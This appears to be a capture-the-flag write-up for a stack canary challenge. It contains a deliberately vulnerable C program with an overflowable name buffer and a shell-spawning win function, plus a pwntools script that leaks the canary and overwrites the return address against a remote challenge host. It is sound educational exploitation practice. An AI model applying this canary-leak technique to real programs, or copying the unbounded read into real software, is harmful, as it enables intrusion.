## canary
Canary starts with 0x00 so the print ends there if we dont overwrite it. Knowing this we check the stack using **x/20gx $rsp** and seeing what the buffer size and canary offset is. We then overwrite just the 0x00 so the printf prints out the canary. After this we just send back the buffer for name filled, overwrite the canary with itself, send 8 bytes for bsp and then send the return address.
### main.c
```
#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

  

void win()

{

  system("/bin/sh");

}

  

int main()

{

  setvbuf(stdin, NULL, _IONBF, 0);

  setvbuf(stdout, NULL, _IONBF, 0);

  setvbuf(stderr, NULL, _IONBF, 0);

  

  char name[64];

  char correct = 'n';

  while (correct != 'y') {

    printf("Please enter your name:\n");

    read(0, name, 0x64); // Vulnerable to buffer overflow

    printf("Hello, %s", name);

    printf("Is this name correct [y/n]?\n");

    correct = getchar();

    getchar(); // newline

  }

  

  printf("Welcome, %s! Enjoy the challenge.\n", name);

  return 0;

}
```

### sol.py
```
from pwn import *

  

# Use one of the following at a time

#p = process('./main') # Local challenge

#p = gdb.debug('./main', gdbscript='''

#    b *main

#''') # Local challenge with debugger

#p = remote('localhost', 1337) # Docker challenge

p = remote('inst-6wlsvfr8dg.tls.vuln.si', 443, ssl=True) # Remote challenge on the instancer

  

#canary se vedno konca z 00, zaradi little endian je to prvi element

#zato prepisemo cel buffer in se 1 byte, da lahko izpisemo canary

#nato ga nazaj zapisemo. (rabi loop pred return)

  

# win address is 0x4011f6 + 8 for return address

# canary address is 0x7ffeb0fc76a8

  

payload = b'A' * 72

p.sendline(payload)

p.recvline() # Please enter your name:

p.recvline() # Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

  

canary =b'\x00' + p.recv(7)  # Add the null byte back to the end of the canary

canary = u64(canary)  # Convert the canary from bytes to an integer

print(f'Canary: {hex(canary)}')

  

p.recvline() # Is this name correct [y/n]?

p.sendline(b'n') # Deny the name to trigger the loop and allow us to overwrite the canary

  

print('Denied name, sending payload to overwrite canary and return address...')

payload = b'A' * 72 + p64(canary) + b'B' * 8 + p64(0x4011fe) # Buffer overflow with canary, padding, and win address

p.sendline(payload)

  

p.interactive()
```